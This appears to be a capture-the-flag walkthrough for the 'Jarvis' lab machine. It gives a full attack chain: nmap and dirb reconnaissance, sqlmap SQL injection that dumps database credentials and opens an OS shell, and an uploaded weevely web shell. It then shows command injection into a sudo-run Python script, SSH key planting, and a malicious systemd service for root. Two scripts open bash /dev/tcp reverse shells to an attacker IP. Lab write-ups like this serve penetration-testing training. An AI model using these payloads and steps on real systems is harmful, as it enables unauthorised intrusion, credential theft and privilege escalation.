Jarvis:
# When running scans and injections on the website you will be banned each time you run.
Helpful links:
https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e
https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
https://medium.com/bugbountywriteup/sqlmaps-os-shell-backdooring-website-with-weevely-8cb6dcf17fa4
Tools:
OWASP-ZAP,dirb,sqlmap,nmap,systemctl,weevely,lots of research
Other:
Infoblox NetMRI 7.1.4 Shell Escape / Privilege Escalation
~exploit/multi/http/phpmyadmin_lfi_rce > reverse shell if you have creds. Creds can be found after running sqlmap, but getting a reverse shell and escaping to other users is a little easier when not in metasploit.


Host Jarvis: 10.10.10.143
nmap -sC -sV -A 10.10.10.143

	22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.25 ((Debian))
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.25 (Debian)
	|_http-title: Stark Hotel

Run 'dirb http://10.10.10.143'
http://10.10.10.143/phpmyadmin/* looks interesting > http://10.10.10.143/phpmyadmin/libraries/
--
SQLMap:
sqlmap -u 'url' --dbs
sqlmap -u 'url' --tables -D mysql
sqlmap -u 'url' --colums -D mysql -T 'name'
sqlmap -u 'url' --dump -D mysql -T 'name' (will dump what is inside to screen)
http://10.10.10.143/room.php?cod=1
http://10.10.10.143/room.php?cod=2
http://10.10.10.143/room.php?cod=3
http://10.10.10.143/room.php?cod=4
http://10.10.10.143/room.php?cod=5
http://10.10.10.143/room.php?cod=6
http://10.10.10.143/room.php?cod=7
http://10.10.10.143/room.php?cod=8-2 > Might be a good one
DataBases:
hotel
information_schema
mysql
performance_schema
test
wskce

Mysql databases usually hold users and passwords, use sqlmap to gather information that might be useful. 'sqlmap -hh' will give all the information needed in the event of going down the rabbit hole.

	sqlmap -u http://10.10.10.143/room.php?cod=8-2 --columns -D mysql -T user
	sqlmap -u http://10.10.10.143/room.php?cod=8-2 --dump -D mysql -T user -C Password
Password: imissyou User: DBadmin > password can be decrypted through sqlmap or you can take the hash and run it through hashcat

Go to the phpmyadmin page and login. After logging in, user could create a reverse shell by making a new entry into the db but sqlmap is a little faster.
\\
'sqlmap -u http://10.10.10.143/room.php?cod=8-2 -D mysql --os-shell' this will give an interactive shell to the user if the database is exploitable.

Use weevely to generate a reverse shell payload that can be uploaded to the website to gain access as www-data. Using the --os-shell will only go so far, it still is not a full tty shell.

weevely generate r0m /root/Desktop/sys.php - generates the payload > then use that file in the upload
weevely http://10.10.10.143/sys.php r0m - After the file has been uploaded, use this to access the payload to gain access
//
To make things easier, create a reverse shell in /tmp that will allow you to not use the weevely shell that was created. Do note that making changes to files can only be done in the weevely shell but will help you move around as well as try many ways to escape the shell jail. Some of the commands to view what things you can and cannot do need to be done outside of the payload shell. (use a reverse shell and nc to get another shell to work in)

Inside a nc reverse shell, user can notice that there is a program that can be run by running 'sudo -l' with sudo permissions

	sudo -u pepper /var/www/Admin-Utilities/simpler.py -p (prompt for ip on next line) 
	$(bash shell.sh) - this file should be made in the same place that the script is run, unless the path to the file is listed in the command. 

Inside the shell.sh file 

	shell.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.60/8889 0>&1
	
On kali listen to port you set for shell.sh to get reverse into pepper, since pepper is the user that can run the script/program.

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p $(cat /home/pepper/user.txt) > to get the flag from pepper if there are difficulties getting a shell as pepper.
\\
After you have a shell as pepper, notice that the shell still is not a full shell. SSH is your friend and creating a bypass for pepper's password can be done by creating ssh keys that will be used to get in
>ssh-keygen 
	move private key to kali
rename id_rsa.pub to 'authorized_keys'
	ssh using id_rsa to pepper@10.10.10.143
should be able to ssh as pepper 

Section 2:
Now that ssh as pepper has been achieved, use nc to move over pspy64(process watcher) and or linenum(to check permissons on important things) to get the lay of the land as to what to do next. Also, can just make the files or use 'ps' and find/grep commands to check permissions, but adding scripts will move the process along faster.

https://gtfobins.github.io/gtfobins/systemctl/ > this link will help with gaining root
systemctl: ( will note that pepper can start/make services but the owner of the priv. is root. Will most likely give a root shell if exploitable)
systemctl enable /tmp/name.service (to enable the service)
systemctl start name.service (to start the service)

name.service:
[Unit]
Description=root shell
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/usr/bin/env bash /tmp/top.sh

[Install]
WantedBy=multi-user.target

\\
inside top.sh
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.60/8889 0>&1

With nc listening to the port from the shell made, when the system is started by root. Root access has been achieved.
